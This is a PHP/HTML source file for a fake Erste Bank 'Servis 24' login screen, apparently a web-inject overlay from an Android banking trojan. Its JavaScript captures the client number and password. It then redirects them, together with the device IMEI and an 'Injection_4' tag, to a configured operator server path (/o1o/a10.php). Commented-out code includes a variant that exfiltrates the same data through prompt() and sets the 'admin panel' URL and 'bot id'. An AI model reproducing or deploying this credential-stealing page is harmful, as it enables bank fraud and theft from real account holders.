<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Service-24</title>
    <style>
        body {
            color: #000000;
            font-size: small;
            font-family: Arial, serif;
            margin: 0;
            padding: 0;
            background: #CCE5F7;
            height: 188px;
        }

        .submit-button {
            margin-bottom: 10px;
            width: 40%;
			color: #fff;
            background: #729fc3;
            font-weight: bold;
            margin-right: 10px;
            border: 0px none #036;
            height: 40px;
        }

        .none {
            margin: 0;
            padding: 0;
            border: 0
        }

        .field-block {
            padding: 4px 0
        }

        .dunkelblau {
            color: #000
        }

        .header {
            padding: 8px;
            text-align: center;
            background-color: #CCE5F7;
        }

        .content {
            margin: 0;
            padding: 0;
            background-color: #CCE5F7;
            margin-left: 10px
        }

        .teaser_box {
            margin-bottom: 10px;
            border-color: #FFFFFF;
            padding: 4px 0
        }


		.input-field {
			color: #729fc3;
			width: 40%;
			margin-right: 10px;
			border: 0 none;
			border-bottom: 2px solid #729fc3;
			text-align: center;
			height: 30px;
		}

        .fielderror {
            border: 1px solid #f00;
			color: #729fc3;
			width: 40%;
			margin-right: 10px;
			text-align: center;
			height: 30px;
        }
    </style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>


    <div class="fitMlbody" id="content_div">
        <div class="header">
            <img src="data:image/png;base64,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" class="none" alt="Erste Bank Logo" border="0">
        </div><br><br><br><br><br><br><br><br>

        <section class="content">
            <form action="null" method="post" id="_mainForm" target="flow_handler">
                <div class="teaser_box">
				<center>
                    <div class="field-block">
                        <input name="Klientske cislo" id="login" placeholder="Klientské číslo" maxlength="10" class="input-field" type="text" />
                    </div>
                    <br />

                    <div class="field-block">
                        <input class="input-field" name="Heslo" placeholder="Heslo" id="password" maxlength="500" type="password" />
                        <br />
                        <br />
                    </div>
                    <input name="name" value="Service 24" type="hidden">

                    <div class="field-block">
                        <input value="Přihlásit" id="submitBtn1" class="submit-button" type="button">
                        <br />
                    </div>
					</center>
                </div>
            </form>
        </section>

        <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    </div>

                <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                    /*var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						top['closeDlg'] = true;
						/*prompt('send', '{"dialog id" : "servis24'+
						'", "klientske_cislo": "'+oNumInp.value+
						'", "heslo": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|servis24|"+oNumInp.value+"|"+oCodeInp.value+"|");
						
						return false;
                    };

                })();
            </script>

</body>
</html>
